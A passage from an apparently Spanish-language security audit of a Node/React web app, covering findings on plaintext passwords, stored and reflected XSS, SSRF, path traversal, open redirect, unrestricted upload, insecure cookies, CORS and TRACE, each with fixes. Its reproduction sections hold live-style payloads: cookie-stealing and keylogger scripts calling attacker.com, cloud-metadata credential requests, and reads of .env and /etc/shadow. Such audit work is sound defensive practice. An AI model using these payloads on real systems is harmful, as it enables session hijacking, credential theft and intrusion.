// Versión segura (para uso en diagnóstico interno únicamente):
function safeDebug(req, res) {
  res.json({
    uptime: process.uptime(),
    memoryUsage: process.memoryUsage(),
    nodeVersion: process.version,
    // NUNCA incluir process.env ni información de secretos
  });
}
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Muy Baja         |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | < 1 hora           |

---

## SEC-009: Contraseñas Almacenadas en Texto Plano

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-009                                                          |
| **Nombre**                 | Contraseñas en Texto Plano — Sin Hashing Criptográfico           |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                                |
| **Tipo**                   | Insecure Password Storage                                        |
| **Severidad**              | 🟠 Alta                                                          |
| **CVSS v3.1**              | 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)                       |
| **Herramienta detectora**  | Revisión Manual + SonarQube                                      |
| **CWE**                    | CWE-256: Unprotected Storage of Credentials / CWE-916: Use of Password Hash With Insufficient Computational Effort |

### Descripción Técnica

Las contraseñas de los usuarios son almacenadas en la base de datos SQLite en texto plano, sin ningún tipo de hashing, salting ni cifrado. Cualquier acceso a la base de datos (por SQLi, por acceso físico al archivo, por backup comprometido) expone inmediatamente todas las contraseñas de todos los usuarios.

### Evidencia — `backend/src/db/init.js`

```javascript
// Seed de datos iniciales — contraseñas en TEXTO PLANO
db.run(`INSERT OR IGNORE INTO users (username, password, role, email, fullName) VALUES 
  ('admin',   'admin123',    'admin',   'admin@carterapro.com',   'Administrador'),
  ('jperez',  'password456', 'user',    'jperez@carterapro.com',  'Juan Pérez'),
  ('mgarcia', 'secret789',   'manager', 'mgarcia@carterapro.com', 'María García'),
  ('rlopez',  'rlopez2024',  'user',    'rlopez@carterapro.com',  'Roberto López')
`);
// Las contraseñas son exactamente como se ven — sin hash
```

**`backend/src/controllers/authController.js`:**

```javascript
// Comparación de contraseña en texto plano
db.get(sql, (err, user) => {
  // Comparación directa de string — sin bcrypt.compare
  if (user.password !== password) {
    return res.status(401).json({ error: 'Password incorrecto' });
  }
  // ...
});
```

### Reproducibilidad

```bash
# Si se obtiene acceso a la BD (por SQLi o acceso directo al archivo):
sqlite3 cartera.sqlite "SELECT username, password, role FROM users;"
# Resultado:
# admin|admin123|admin
# jperez|password456|user
# mgarcia|secret789|manager
```

### Impacto Técnico

- Una sola exfiltración de la base de datos (por SQLi, por acceso al archivo .sqlite) expone todas las contraseñas inmediatamente, sin necesidad de cracking.
- Las contraseñas obtenidas pueden usarse en ataques de **credential stuffing** contra otros servicios (muchos usuarios reutilizan contraseñas).
- No hay mecanismo de detección: si la BD es copiada, no hay rastro de quién accedió.

### Impacto de Negocio

- Violación de la privacidad de todos los usuarios del sistema.
- Incumplimiento de RGPD/LOPD respecto a la protección de datos personales.
- Responsabilidad legal si las contraseñas comprometidas son usadas en otros servicios.

### Causa Raíz

Ausencia de conocimiento o aplicación de estándares de almacenamiento de contraseñas. Se omitió el paso de hashing durante el desarrollo inicial.

### Solución Recomendada

```javascript
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Al crear/actualizar un usuario:
const passwordHash = await bcrypt.hash(plainTextPassword, SALT_ROUNDS);
db.run('INSERT INTO users (username, password_hash, ...) VALUES (?, ?, ...)',
  [username, passwordHash, ...]);

// Al verificar la contraseña en login:
const isValid = await bcrypt.compare(plainTextPassword, user.password_hash);
if (!isValid) {
  return res.status(401).json({ error: 'Credenciales incorrectas' });
}

// Migración de contraseñas existentes:
// Requiere que todos los usuarios cambien su contraseña al primer login
```

| Campo                       | Valor      |
|-----------------------------|------------|
| **Complejidad de Corrección** | Media    |
| **Prioridad**               | Alta       |
| **Esfuerzo estimado**       | 4–6 horas  |

---

## SEC-010: XSS Almacenado (Stored XSS) en Notas de Clientes

| Campo                      | Detalle                                                              |
|----------------------------|----------------------------------------------------------------------|
| **Identificador**          | SEC-010                                                              |
| **Nombre**                 | Cross-Site Scripting Almacenado — Notas de Clientes sin Sanitización |
| **Categoría OWASP**        | A03:2021 – Injection (XSS)                                           |
| **Tipo**                   | Stored XSS (Persistent XSS)                                         |
| **Severidad**              | 🟠 Alta                                                              |
| **CVSS v3.1**              | 8.8 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)                           |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual + DevTools                               |
| **CWE**                    | CWE-79: Improper Neutralization of Input During Web Page Generation  |

### Descripción Técnica

Los componentes React `Clients.jsx` y `ClientDetail.jsx` renderizan el campo `notes` de los clientes usando `dangerouslySetInnerHTML={{ __html: c.notes }}`, sin ningún proceso de sanitización. Esto permite que cualquier usuario que pueda crear o editar un cliente inyecte HTML y JavaScript arbitrario que será ejecutado en el navegador de **todos los usuarios** que visualicen ese cliente.

### Evidencia — `frontend/src/pages/Clients.jsx`

```jsx
// Renderizado inseguro de notas HTML
{clients.map(c => (
  <tr key={c.id}>
    <td>{c.name}</td>
    <td>{c.email}</td>
    {/* VULNERABILIDAD: dangerouslySetInnerHTML sin sanitización */}
    <td dangerouslySetInnerHTML={{ __html: c.notes }} />
    {/*  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         Renderiza HTML arbitrario directamente en el DOM.
         React advierte explícitamente con "dangerous" en el nombre del prop */}
  </tr>
))}
```

**`frontend/src/pages/ClientDetail.jsx`:**

```jsx
<div
  className="notes-content"
  {/* MISMA VULNERABILIDAD en la vista de detalle */}
  dangerouslySetInnerHTML={{ __html: client.notes }}
/>
```

### Evidencia — Datos en base de datos (ya comprometidos)

Los datos semilla en `db/init.js` ya contienen HTML en el campo `notes`:

```sql
INSERT INTO clients (name, notes) VALUES 
  ('Cliente Demo', '<b>observaciones HTML</b> y <span style="color:#dc2626">alertas</span>'),
  ('Empresa XYZ',  '<em>Nota importante</em> — revisar facturas pendientes');
```

### Reproducibilidad

**Payload de robo de sesión:**

```bash
# Crear cliente con payload XSS almacenado
curl -X POST http://localhost:4000/api/clients \
  -H "Content-Type: application/json" \
  -H "Authorization: token-1-admin-admin" \
  -d '{
    "name": "Cliente XSS Test",
    "notes": "<img src=x onerror=\"document.location='\''http://attacker.com/steal?c='\''+document.cookie\">"
  }'

# Cuando cualquier usuario visite la lista de clientes, se ejecuta:
# → Redirección al servidor del atacante con el cookie de sesión
```

**Payload de keylogger:**

```html
<script>
document.addEventListener('keydown', function(e) {
  new Image().src = 'http://attacker.com/keys?k=' + e.key;
});
</script>
```

### Impacto Técnico

- **Robo de sesiones:** El atacante puede obtener los tokens de sesión de todos los usuarios que vean los clientes afectados.
- **Phishing interno:** Inyección de formularios de login falsos en la interfaz legítima.
- **Propagación:** El XSS se activa para **todos** los usuarios que vean la lista de clientes, no solo para el atacante.
- **Keylogging, exfiltración de datos:** Captura de todas las interacciones del usuario.

### Impacto de Negocio

- Compromiso de cuentas de usuarios y administradores mediante robo de sesiones.
- Posible escalada a compromiso del servidor si los tokens robados permiten acceder a endpoints de RCE.
- Daño reputacional si los usuarios son redirigidos a sitios de phishing.

### Causa Raíz

Uso de `dangerouslySetInnerHTML` sin sanitización. Este prop de React existe para casos excepcionales donde el HTML es de confianza; su uso con datos de usuario es siempre incorrecto.

### Solución Recomendada

```javascript
// Instalar DOMPurify para sanitización segura:
// npm install dompurify

import DOMPurify from 'dompurify';

// Opción 1: Sanitizar antes de renderizar con dangerouslySetInnerHTML
<td dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(c.notes, { ALLOWED_TAGS: ['b', 'em', 'span'] }) 
}} />

// Opción 2 (preferida): No permitir HTML en notas — renderizar como texto plano
<td>{c.notes}</td>
// React escapa automáticamente el HTML cuando se usa como texto

// Opción 3: Validación en el backend antes de guardar
const createClient = (req, res) => {
  const notes = DOMPurify.sanitize(req.body.notes); // sanitizar en servidor
  db.run('INSERT INTO clients (notes) VALUES (?)', [notes], ...);
};
```

| Campo                       | Valor      |
|-----------------------------|------------|
| **Complejidad de Corrección** | Baja     |
| **Prioridad**               | Alta       |
| **Esfuerzo estimado**       | 2–4 horas  |

---

## SEC-011: XSS Reflejado en Endpoint Administrativo

| Campo                      | Detalle                                                              |
|----------------------------|----------------------------------------------------------------------|
| **Identificador**          | SEC-011                                                              |
| **Nombre**                 | Cross-Site Scripting Reflejado — Parámetro msg sin Escape            |
| **Categoría OWASP**        | A03:2021 – Injection (XSS)                                           |
| **Tipo**                   | Reflected XSS                                                        |
| **Severidad**              | 🟠 Alta                                                              |
| **CVSS v3.1**              | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)                           |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                          |
| **CWE**                    | CWE-79: Improper Neutralization of Input During Web Page Generation  |

### Descripción Técnica

El endpoint `GET /api/admin/lab/xss` interpola directamente el parámetro `msg` de la query string en el cuerpo de una respuesta HTML, sin ningún tipo de escape o codificación. Esto permite inyectar código HTML/JavaScript arbitrario que es ejecutado en el contexto del dominio de la aplicación cuando la víctima visita una URL especialmente construida.

### Evidencia — `backend/src/controllers/adminController.js`: función `reflectedXss`

```javascript
function reflectedXss(req, res) {
  const msg = req.query.msg || 'Hola mundo';
  
  // VULNERABILIDAD: interpolación directa en HTML sin escape
  res.setHeader('Content-Type', 'text/html');
  res.send(`
    <html>
      <body>
        <h1>Mensaje del sistema:</h1>
        <!-- msg es directamente interpolado — cualquier HTML/JS es ejecutado -->
        <p>${msg}</p>
        <!--  ^^^^ 
              Si msg = "<script>alert(1)</script>"
              El script se ejecuta en el navegador de la víctima -->
      </body>
    </html>
  `);
}
```

### Reproducibilidad

```
URL de ataque:
http://localhost:4000/api/admin/lab/xss?msg=<script>alert(document.domain)</script>

URL de robo de cookie (para enviar a víctima por email/chat):
http://localhost:4000/api/admin/lab/xss?msg=<script>new%20Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

### Impacto Técnico

- Ejecución de JavaScript arbitrario en el contexto del dominio de la aplicación.
- Robo de cookies de sesión si `httpOnly` es `false` (ver SEC-016).
- Phishing: manipulación del DOM para presentar formularios falsos.
- Requiere que la víctima haga clic en un enlace malicioso (ingeniería social).

### Solución Recomendada

```javascript
// Usar una función de escape HTML
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function reflectedXss(req, res) {
  const msg = escapeHtml(req.query.msg || 'Hola mundo');
  res.setHeader('Content-Type', 'text/html');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.send(`<html><body><p>${msg}</p></body></html>`);
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 1 hora    |

---

## SEC-012: Server-Side Request Forgery (SSRF)

| Campo                      | Detalle                                                           |
|----------------------------|-------------------------------------------------------------------|
| **Identificador**          | SEC-012                                                           |
| **Nombre**                 | Server-Side Request Forgery — Peticiones HTTP Arbitrarias         |
| **Categoría OWASP**        | A10:2021 – Server-Side Request Forgery (SSRF)                     |
| **Tipo**                   | SSRF — Full (sin restricciones de protocolo ni destino)           |
| **Severidad**              | 🟠 Alta                                                           |
| **CVSS v3.1**              | 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)                        |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                       |
| **CWE**                    | CWE-918: Server-Side Request Forgery (SSRF)                       |

### Descripción Técnica

El endpoint `GET /api/admin/lab/fetch` acepta un parámetro `url` y realiza una petición HTTP a esa URL usando `axios.get()` en el servidor, devolviendo la respuesta al cliente. Esto permite a un atacante usar el servidor de la aplicación como **proxy para realizar peticiones a recursos arbitrarios**, incluyendo servicios internos de la red privada, metadatos de instancias cloud y servicios locales no expuestos públicamente.

### Evidencia — `backend/src/controllers/adminController.js`: función `ssrfFetch`

```javascript
const axios = require('axios');

async function ssrfFetch(req, res) {
  const url = req.query.url; // URL completamente controlada por el atacante
  
  try {
    // VULNERABILIDAD: petición HTTP sin restricción de destino
    const response = await axios.get(url);
    //                            ^^^
    //  Puede apuntar a: localhost, red interna, metadatos cloud, etc.
    
    res.json({
      url,
      status: response.status,
      data: response.data,    // Devuelve la respuesta completa al atacante
      headers: response.headers
    });
  } catch (e) {
    res.status(500).json({ error: e.message, url });
  }
}
```

### Reproducibilidad

**Acceso a metadatos de instancia AWS (en entorno cloud):**

```bash
curl "http://localhost:4000/api/admin/lab/fetch?url=http://169.254.169.254/latest/meta-data/"
# Respuesta: listado de metadatos de la instancia EC2
# Incluyendo: ami-id, instance-id, iam/security-credentials/...

curl "http://localhost:4000/api/admin/lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
# Respuesta: credenciales AWS temporales con AccessKeyId, SecretAccessKey, Token
```

**Escaneo de red interna:**

```bash
# Descubrir servicios internos
curl "http://localhost:4000/api/admin/lab/fetch?url=http://192.168.1.1"
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.1:6379"  # Redis
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.1:27017" # MongoDB
```

**Bypass de controles de red (desde servidor con acceso a red interna):**

```bash
curl "http://localhost:4000/api/admin/lab/fetch?url=http://internal-admin-panel.corp.local"
```

### Impacto Técnico

- En entornos cloud (AWS, GCP, Azure): obtención de credenciales IAM temporales con privilegios potencialmente altos.
- Escaneo y acceso a servicios de red interna no expuestos públicamente.
- Exfiltración de datos desde servicios internos (bases de datos, APIs internas).
- Bypass de firewalls y controles de red perimetral.
- En AWS, con los metadatos correctos: escalada a privilegios de administrador de la cuenta cloud.

### Impacto de Negocio

- Potencial acceso a toda la infraestructura interna de la organización.
- En cloud: compromiso de toda la cuenta AWS/GCP/Azure.
- Exfiltración de datos de sistemas internos no directamente accesibles.

### Causa Raíz

Ausencia de validación de la URL destino. No existe lista blanca de destinos permitidos, ni filtrado de IPs privadas/reservadas.

### Solución Recomendada

```javascript
const { URL } = require('url');

// Lista blanca de dominios permitidos
const ALLOWED_HOSTS = ['api.example.com', 'data.example.com'];

async function safeFetch(req, res) {
  try {
    const targetUrl = new URL(req.query.url);
    
    // Rechazar IPs privadas y reservadas
    const privateRanges = [/^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2[0-9]|3[01])\./];
    const isPrivateIp = privateRanges.some(r => r.test(targetUrl.hostname));
    
    if (isPrivateIp || targetUrl.hostname === 'localhost') {
      return res.status(400).json({ error: 'Destino no permitido' });
    }
    
    if (!ALLOWED_HOSTS.includes(targetUrl.hostname)) {
      return res.status(400).json({ error: 'Host no incluido en lista blanca' });
    }
    
    const response = await axios.get(targetUrl.toString(), { timeout: 5000 });
    res.json({ data: response.data });
  } catch (e) {
    res.status(400).json({ error: 'URL inválida o destino no accesible' });
  }
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Media   |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 2–4 horas |

---

## SEC-013: Path Traversal — Local File Inclusion (LFI)

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-013                                                         |
| **Nombre**                 | Path Traversal — Lectura de Archivos Arbitrarios del Servidor   |
| **Categoría OWASP**        | A01:2021 – Broken Access Control                                |
| **Tipo**                   | Path Traversal / Local File Inclusion (LFI)                     |
| **Severidad**              | 🟠 Alta                                                         |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                      |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                     |
| **CWE**                    | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |

### Descripción Técnica

El endpoint `GET /api/admin/lab/file` acepta el parámetro `path` y lo utiliza para construir una ruta de archivo usando `path.join(process.cwd(), requested)`, devolviendo el contenido del archivo al cliente. No existe ninguna validación ni sanitización del parámetro, permitiendo el uso de secuencias `../` para salir del directorio de trabajo y acceder a **cualquier archivo del sistema de archivos** al que tenga acceso el proceso Node.js.

### Evidencia — `backend/src/controllers/adminController.js`: función `readLocalFile`

```javascript
const path = require('path');
const fs = require('fs');

function readLocalFile(req, res) {
  const requested = req.query.path;
  
  // VULNERABILIDAD: path.join no previene path traversal
  // Si requested = '../../.env', el resultado es la ruta del .env
  const filePath = path.join(process.cwd(), requested);
  //               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  //  path.join normaliza pero NO restringe al directorio base
  
  // Sin verificación de que filePath esté dentro del directorio permitido
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: err.message, path: filePath });
      //                                                 ^^^^ ruta expuesta en error
    }
    res.json({ path: filePath, content: data }); // contenido del archivo al atacante
  });
}
```

### Reproducibilidad

**Lectura del archivo .env:**

```bash
curl "http://localhost:4000/api/admin/lab/file?path=../../.env"
# path.join('/app/backend', '../../.env') → '/app/.env' o similar
# Respuesta: contenido del archivo .env con todos los secretos
```

**Lectura de archivos del sistema:**

```bash
curl "http://localhost:4000/api/admin/lab/file?path=../../../etc/passwd"
curl "http://localhost:4000/api/admin/lab/file?path=../../../etc/shadow"
curl "http://localhost:4000/api/admin/lab/file?path=../../package.json"
curl "http://localhost:4000/api/admin/lab/file?path=../../src/controllers/authController.js"
```

### Impacto Técnico

- Lectura de cualquier archivo accesible por el proceso Node.js.
- Exfiltración del archivo `.env` con todos los secretos (complementa SEC-007).
- Lectura de archivos de configuración del sistema (`/etc/passwd`, `/etc/hosts`).
- Lectura del código fuente completo de la aplicación.
- En entornos cloud: lectura de credenciales de servicio, certificados SSL/TLS.

### Solución Recomendada

```javascript
function readLocalFile(req, res) {
  const requested = req.query.path;
  const BASE_DIR = path.join(process.cwd(), 'public'); // directorio restringido
  
  // Resolver la ruta y verificar que esté dentro del directorio base
  const resolvedPath = path.resolve(BASE_DIR, requested);
  
  // VERIFICACIÓN CRÍTICA: el path resultante debe comenzar con BASE_DIR
  if (!resolvedPath.startsWith(BASE_DIR + path.sep)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }
  
  fs.readFile(resolvedPath, 'utf8', (err, data) => {
    if (err) return res.status(404).json({ error: 'Archivo no encontrado' });
    res.json({ content: data });
  });
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 1–2 horas |

---

## SEC-014: Open Redirect sin Validación

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-014                                                         |
| **Nombre**                 | Open Redirect — Redirección a URL Arbitraria                    |
| **Categoría OWASP**        | A01:2021 – Broken Access Control                                |
| **Tipo**                   | Open Redirect                                                   |
| **Severidad**              | 🟡 Media                                                        |
| **CVSS v3.1**              | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)                      |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                     |
| **CWE**                    | CWE-601: URL Redirection to Untrusted Site ('Open Redirect')    |

### Descripción Técnica

El endpoint `GET /api/admin/lab/redirect` acepta un parámetro `next` y realiza una redirección HTTP (`res.redirect`) a esa URL sin ninguna validación. Esto puede ser usado por atacantes para construir URLs aparentemente legítimas del dominio de la organización que redirigen a sitios maliciosos, facilitando ataques de phishing y robo de credenciales.

### Evidencia — `backend/src/controllers/adminController.js`

```javascript
function openRedirect(req, res) {
  const next = req.query.next || '/';
  
  // VULNERABILIDAD: redirección sin validación del destino
  res.redirect(next);
  // next puede ser cualquier URL externa: http://attacker.com/phishing
}
```

### Reproducibilidad

```
URL de ataque enviada por phishing:
http://localhost:4000/api/admin/lab/redirect?next=http://attacker.com/fake-login

La víctima ve una URL del servidor legítimo, hace clic,
y es redirigida al sitio del atacante.
```

### Impacto Técnico

- Facilita ataques de phishing usando el dominio de la organización como vector.
- Algunos filtros de seguridad confían en dominios conocidos, permitiendo bypass.

### Impacto de Negocio

- Robo de credenciales de usuarios mediante páginas de phishing.
- Daño reputacional al asociar el dominio de la organización con sitios maliciosos.

### Solución Recomendada

```javascript
function safeRedirect(req, res) {
  const next = req.query.next || '/';
  
  // Solo permitir redirecciones relativas (mismo dominio)
  if (next.startsWith('/') && !next.startsWith('//')) {
    return res.redirect(next);
  }
  
  // O usar una lista blanca de dominios permitidos
  const ALLOWED_DOMAINS = ['carterapro.com', 'app.carterapro.com'];
  try {
    const url = new URL(next);
    if (ALLOWED_DOMAINS.includes(url.hostname)) {
      return res.redirect(next);
    }
  } catch (e) { /* URL inválida */ }
  
  res.redirect('/'); // Fallback seguro
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 1 hora    |

---

## SEC-015: Carga de Archivos sin Restricción de Tipo

| Campo                      | Detalle                                                              |
|----------------------------|----------------------------------------------------------------------|
| **Identificador**          | SEC-015                                                              |
| **Nombre**                 | Unrestricted File Upload — Sin Validación de Tipo ni Extensión       |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                                 |
| **Tipo**                   | Unrestricted File Upload                                             |
| **Severidad**              | 🟠 Alta                                                              |
| **CVSS v3.1**              | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)                           |
| **Herramienta detectora**  | Revisión Manual + OWASP ZAP                                          |
| **CWE**                    | CWE-434: Unrestricted Upload of File with Dangerous Type             |

### Descripción Técnica

El módulo `uploadController.js` utiliza Multer sin configurar ningún `fileFilter`, sin validación de tipo MIME, sin restricción de extensiones y guardando los archivos con su nombre original. Esto permite subir archivos de cualquier tipo, incluyendo scripts ejecutables, archivos HTML (XSS via subida), y archivos PHP u otros ejecutables dependiendo de la configuración del servidor.

### Evidencia — `backend/src/controllers/uploadController.js`

```javascript
const multer = require('multer');
const path = require('path');

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/'); // directorio de destino
  },
  filename: (req, file, cb) => {
    // VULNERABILIDAD: nombre de archivo original sin sanitización
    cb(null, file.originalname);
    //       ^^^^^^^^^^^^^^^^^ 
    // Permite: ../../etc/cron.d/backdoor, shell.php, malware.exe
    // Path traversal en el nombre del archivo
  }
  // NO HAY fileFilter — se acepta cualquier tipo de archivo
});

const upload = multer({ 
  storage,
  // Sin limits.fileSize — permite archivos de tamaño arbitrario (DoS)
  // Sin fileFilter — sin restricción de tipo MIME
});
```

### Reproducibilidad

**Subida de archivo HTML para XSS:**

```bash
echo '<script>alert(document.cookie)</script>' > xss.html
curl -X POST http://localhost:4000/api/uploads \
  -F "file=@xss.html" \
  -H "Authorization: token-1-user-user"
# El archivo es accesible en: http://localhost:4000/uploads/xss.html
# Si el servidor sirve estáticamente el directorio uploads/ → XSS directo
```

**Path traversal en nombre de archivo (si el SO lo permite):**

```bash
# Archivo con nombre que intenta escapar del directorio
curl -X POST http://localhost:4000/api/uploads \
  --form 'file=@shell.sh;filename=../../startup.sh'
```

### Impacto Técnico

- Subida de archivos maliciosos que pueden ser servidos a otros usuarios.
- Path traversal en el nombre del archivo puede sobrescribir archivos del sistema.
- DoS por archivos muy grandes al no haber límite de tamaño.
- En servidores con soporte PHP/CGI: potencial webshell.

### Solución Recomendada

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => {
    // Nombre aleatorio para evitar path traversal y colisiones
    const uniqueName = crypto.randomBytes(16).toString('hex')
      + path.extname(file.originalname).toLowerCase();
    cb(null, uniqueName);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (req, file, cb) => {
    if (ALLOWED_TYPES.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Tipo de archivo no permitido'), false);
    }
  }
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 2–3 horas |

---

## SEC-016: Cookies de Sesión Inseguras

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-016                                                          |
| **Nombre**                 | Atributos de Seguridad Ausentes en Cookies de Sesión             |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures            |
| **Tipo**                   | Insecure Cookie Configuration                                    |
| **Severidad**              | 🟡 Media                                                         |
| **CVSS v3.1**              | 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)                       |
| **Herramienta detectora**  | OWASP ZAP + DevTools                                             |
| **CWE**                    | CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute / CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag |

### Descripción Técnica

El endpoint `GET /api/admin/lab/cookie` establece una cookie de sesión con los tres atributos de seguridad críticos deshabilitados explícitamente: `httpOnly: false` (permite acceso desde JavaScript), `secure: false` (se transmite en texto plano por HTTP), y `sameSite: false` (sin protección contra CSRF).

### Evidencia — `backend/src/controllers/adminController.js`

```javascript
function setCookie(req, res) {
  // CONFIGURACIÓN INSEGURA: los tres atributos de seguridad en false
  res.cookie('session', 'demo-session-token-abc123', {
    httpOnly: false,    // INSEGURO: accesible via document.cookie → XSS puede robarla
    secure: false,      // INSEGURO: se envía por HTTP sin cifrar → sniffing
    sameSite: false     // INSEGURO: sin protección CSRF
  });
  res.json({ message: 'Cookie establecida', cookieValue: 'demo-session-token-abc123' });
}
```

### Impacto Técnico

- **`httpOnly: false`:** JavaScript puede acceder a la cookie (`document.cookie`). Combinado con XSS (SEC-010, SEC-011), permite robo trivial de sesiones.
- **`secure: false`:** La cookie se envía en conexiones HTTP no cifradas, susceptible a intercepción por Man-in-the-Middle (sniffing en redes Wi-Fi públicas).
- **`sameSite: false`:** Permite ataques CSRF al no restringir el envío de cookies en peticiones cross-origin.

### Solución Recomendada

```javascript
res.cookie('session', sessionToken, {
  httpOnly: true,         // Inaccesible desde JavaScript
  secure: true,           // Solo HTTPS
  sameSite: 'strict',     // Solo same-origin
  maxAge: 8 * 60 * 60 * 1000, // 8 horas de expiración
  path: '/'
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-017: CORS Completamente Abierto + HTTP TRACE Habilitado

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-017                                                            |
| **Nombre**                 | CORS Wildcard + HTTP TRACE — XST y Peticiones Cross-Origin         |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                               |
| **Tipo**                   | CORS Misconfiguration + Dangerous HTTP Method                      |
| **Severidad**              | 🟡 Media                                                           |
| **CVSS v3.1**              | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)                         |
| **Herramienta detectora**  | OWASP ZAP + DevTools + Revisión Manual                             |
| **CWE**                    | CWE-942: Permissive Cross-domain Policy with Untrusted Domains     |

### Descripción Técnica

La configuración CORS en `app.js` utiliza `origin: '*'` (wildcard), permitiendo que cualquier origen realice peticiones cross-origin a la API. Adicionalmente, el método HTTP `TRACE` está habilitado, lo que expone la aplicación al ataque **Cross-Site Tracing (XST)**, que puede usarse para robar cookies y headers de autenticación en combinación con XSS.

### Evidencia — `backend/src/app.js`

```javascript
const cors = require('cors');

// CONFIGURACIÓN INSEGURA: origen wildcard
app.use(cors({
  origin: '*',        // Cualquier dominio puede hacer peticiones
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'],
  //                                                    ^^^^^
  //                               Método TRACE habilitado → vector XST
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Demostración del ataque XST con TRACE:**

```bash
# TRACE refleja los headers de la petición, incluyendo cookies y tokens
curl -X TRACE http://localhost:4000/api/clients \
  -H "Authorization: token-1-admin-admin" \
  -H "Cookie: session=demo-session-token"

# Respuesta del servidor refleja TODOS los headers, incluyendo credenciales:
# TRACE /api/clients HTTP/1.1
# Host: localhost:4000
# Authorization: token-1-admin-admin
# Cookie: session=demo-session-token
```

### Solución Recomendada

```javascript
app.use(cors({
  origin: ['https://app.carterapro.com', 'https://admin.carterapro.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  // TRACE no debe incluirse nunca
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true
}));
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-018: Exposición de Información en Headers HTTP

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-018                                                         |
| **Nombre**                 | Information Disclosure via HTTP Headers                         |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                            |
| **Tipo**                   | Information Disclosure                                          |
| **Severidad**              | 🟡 Media                                                        |
| **CVSS v3.1**              | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)                      |
| **Herramienta detectora**  | OWASP ZAP + DevTools                                            |
| **CWE**                    | CWE-200: Exposure of Sensitive Information to Unauthorized Actor |

### Descripción Técnica

